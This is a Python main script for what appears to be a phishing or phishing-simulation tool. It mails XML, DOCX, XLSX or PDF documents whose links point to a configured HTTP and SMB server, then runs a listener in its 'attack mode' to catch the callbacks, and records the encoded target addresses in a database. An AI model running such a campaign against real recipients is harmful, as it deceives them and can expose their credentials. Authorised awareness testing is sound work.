import time

from multiprocessing import Process, Value
from database import Database
from validate import ConfigParse, Validate, ArgParse
from template import Template, Encode
from smtp import SmtpUnite
from listener import Listener
from time_tracker import execution_time


def listening(http_server, http_port, listener_activity):
    listen = Listener(http_server, http_port)
    if listener_activity.value == 0:
        print('Listener is not running')
    else:
        listen.listener()

def main(mail_list, description, extension, name, listener_activity, template):
    start_time = time.perf_counter() # отсчет времени

    valid = Validate(mail_list, description=description)

    valid_mails, invalid_mails = valid.handle_file()
    print(f'    Valid: {valid_mails}\n')
    print(f'    Invalid: {invalid_mails}')

    # Base64
    code_var = Encode(valid_mails)
    encoded = code_var.encoding()
    decoded = code_var.decoding(encoded)

    # Запомни, а то забудешь
    #if not valid_mails:
    #    print('No valid, all invalid!!!')
    #    listener_activity.value = 0
    #    return

    description = valid.description_checking()

    conf_smtp = conf.smtp_configure()
    smtp_from_addr = conf_smtp[3]

    # Занесение в БД
    conf_db = conf.db_configure()
    db = Database(conf_db)
    db.db_creating()
    db.db_insert(valid_mails, invalid_mails, smtp_from_addr, encoded, description)
    db.db_closing()

    if extension == 'xml':
        file_format = template.link_changing_xml(valid_mails)
    elif extension == 'docx':
        file_format = template.link_changing_docx()
    elif extension == 'xlsx':
        file_format = template.link_changing_xlsx()
    elif extension == 'pdf':
        file_format = template.link_changing_pdf()
    else:
        return False

    # Процесс отправки
    send = SmtpUnite(*conf_smtp, valid_mails, file_format, name)
    send.sending()

    start_time = execution_time(start_time, "after sending") # отсчет времени

if __name__ == "__main__":
    conf = ConfigParse() # из-за переноса ip и port в конфиг
    http_server, http_port = conf.http_configure()
    smb_server = conf.smb_configure()

    args = ArgParse.parser_args() # в listener и main нужны server, port | чтобы не дублировать

    mail_list = args.mail_list
    extension = args.extension
    description = args.description
    name = args.name
    attack_mode = args.mode

    conf_template = conf.template_configure() # из-за режима static
    template = Template(
        http_server,
        http_port,
        smb_server,
        name=name,
        dir_new_templates=conf_template
    )

    listener_activity = Value('i', 1)
    if attack_mode == 1:
        print('Chosen attack mode. Listener and sending are starting')

        listener_proc = Process(target=listening, args=(http_server, http_port, listener_activity))
        listener_proc.start()

        main(mail_list, description, extension, name, listener_activity, template)

        try:
            listener_proc.join()
        except KeyboardInterrupt:
            listener_proc.terminate()
            listener_proc.join()

    elif attack_mode == 2:
        print('Chosen only listener mode. Listener is starting')

        listener_proc = Process(target=listening, args=(http_server, http_port, listener_activity))
        listener_proc.start()

        try:
            listener_proc.join()
        except KeyboardInterrupt:
            listener_proc.terminate()
            listener_proc.join()

    elif attack_mode == 3:
        print('Chosen sending mode. Sending is starting')
        main(mail_list, description, extension, name, listener_activity, template)

    elif attack_mode == 4:
        print('Chosen static mode.')
        template.link_changing_xml(save=True)

    elif attack_mode == 5:
        print('Chosen report mode. File was saved to ...')
